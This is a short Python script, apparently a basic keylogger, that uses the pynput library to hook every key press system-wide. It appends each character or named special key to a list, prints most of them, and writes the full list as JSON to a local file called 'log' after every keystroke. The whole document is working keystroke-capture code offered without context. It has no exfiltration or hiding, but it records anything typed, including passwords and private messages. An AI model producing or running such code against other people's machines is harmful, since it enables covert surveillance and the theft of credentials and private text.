
from pynput.keyboard import Key, Listener
import pynput.keyboard
import logging
import json

lst = []
def on_press(key):
    try:
        c = key.char
        print(c)
        lst.append(c)
    except AttributeError:
        if Key.space is key:
            s = 'space'
            print(s)
            lst.append(s)
        elif Key.backspace is key:
            d = 'del'
            lst.append(d)
        elif Key.enter is key:
            e = 'enter'
            lst.append(e)
        elif Key.shift is key:
            s = 'shift'
            lst.append(s)
        else:
            k = str(key)
            print(k)
            lst.append(k)
    json.dump(lst, open('log', 'w'))


with Listener(on_press=on_press) as listener:
    listener.join()

